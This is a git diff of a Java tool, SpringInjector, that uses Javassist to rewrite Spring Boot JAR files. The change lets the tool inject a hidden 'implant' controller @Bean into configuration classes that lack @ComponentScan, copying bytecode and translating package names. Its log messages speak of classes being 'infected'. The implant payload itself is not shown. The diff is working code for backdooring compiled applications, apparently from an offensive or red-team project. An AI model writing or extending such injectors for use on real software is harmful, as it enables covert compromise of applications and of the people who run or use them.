@@ -1,18 +1,14 @@
 package org.example.injector;
 
-import javassist.bytecode.AnnotationsAttribute;
-import javassist.bytecode.ClassFile;
-import javassist.bytecode.DuplicateMemberException;
-import javassist.bytecode.MethodInfo;
+import javassist.bytecode.*;
 import javassist.bytecode.annotation.Annotation;
+import org.example.implants.SpringImplantConfiguration;
 import org.example.implants.SpringImplantController;
 
 import java.io.*;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.Arrays;
-import java.util.Enumeration;
-import java.util.List;
+import java.util.*;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
 import java.util.jar.JarOutputStream;
@@ -87,8 +83,19 @@ public class SpringInjector {
                         // TODO Explicitly add a @Bean to the configuration
                         // Maybe it doesn't hurt to add it despite @ContentScan being enabled?
 
-                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan). Infection not (yet) supported!");
-                        continue;
+                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan).");
+
+                        try {
+                            ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(SpringImplantConfiguration.class);
+                            if (!addSpringBean(classFile, implantSpringConfig)) {
+                                throw new RuntimeException("Failed.");  // TODO Do better error handling
+                            }
+                        } catch (ClassNotFoundException e) {
+                            throw new RuntimeException(e);
+                        }
+
+                        newEntry(classFile, jarOutputStream, entry);
+                        System.out.println("[+] Injected @Bean method into '" + classFile.getName() + "'.");
                     } else {
                         passEntry(targetJar, jarOutputStream, entry);
                     }
@@ -135,26 +142,48 @@ public class SpringInjector {
 
     private ClassFile loadImplantClass() throws IOException {
         try {
+            // TODO Add class translation hashmap thing as param here
             return ImplantReader.findAndReadClassFile(SpringImplantController.class);
         } catch (ClassNotFoundException e) {
             throw new RuntimeException(e);
         }
     }
 
-    private boolean addSpringBean(ClassFile springConfigClass, final ClassFile implantClass) {
-        MethodInfo dummyImplant = springConfigClass.getMethod("getImplantController");    // TODO Don't hardcode this
-        if (dummyImplant != null) {
-            System.out.println("[-] Class '" + springConfigClass.getName() + "' already infected. Skipping.");
+    private boolean addSpringBean(ClassFile existingSpringConfigClass, final ClassFile implantSpringConfig) {
+        MethodInfo existingImplantControllerBean = existingSpringConfigClass.getMethod("getImplantController");    // TODO Don't hardcode this
+        if (existingImplantControllerBean != null) {
+            System.out.println("[-] Class '" + existingSpringConfigClass.getName() + "' already infected. Skipping.");
             return false;
         }
 
-        // TODO Just copy over a pre-compiled method
-
         try {
-            springConfigClass.addMethod(dummyImplant);
+            String targetPackageName = parsePackageNameFromFqcn(existingSpringConfigClass.getName());
+            String implantPackageName = parsePackageNameFromFqcn(implantSpringConfig.getName());
+            String targetPackageDesc = targetPackageName.replace(".", "/");
+            String implantPackageDesc = implantPackageName.replace(".", "/");
+
+            // More or less code duplication from MethodInjector.infectTarget() - consider refactoring
+            MethodInfo implantBeanMethod = implantSpringConfig.getMethod("getImplantController");  // Same as above
+            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
+            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfigClass.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+            //targetBeanMethod.setExceptionsAttribute(implantBeanMethod.getExceptionsAttribute());
+
+            Map<String, String> translateTable = new HashMap<>();
+            // TODO Don't hardcode
+            translateTable.put("org/example/implants/SpringImplantController", "com/example/restservice/SpringImplantController");
+            translateTable.put("org/example/implants/SpringImplantConfiguration", "com/example/restservice/RestServiceApplication");
+            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfigClass.getConstPool(), translateTable);
+            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals()); // Will this do the trick or is some fixed value necessary?
+            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Same weird workaround
+            targetBeanMethod.setCodeAttribute(codeAttr);
+
+            AnnotationsAttribute runtimeVisibleAnnotations = new AnnotationsAttribute(targetBeanMethod.getConstPool(), "RuntimeVisibleAnnotations");
+            runtimeVisibleAnnotations.addAnnotation(new Annotation("org.springframework.context.annotation.Bean", implantSpringConfig.getConstPool()));
+            targetBeanMethod.getAttributes().add(runtimeVisibleAnnotations);
+
+            existingSpringConfigClass.addMethod(targetBeanMethod);
         } catch (DuplicateMemberException e) {
-            System.out.println("[!] Unexpected error: " + e.getMessage());
-            return false;
+            throw new RuntimeException(e);
         }
 
         return true;
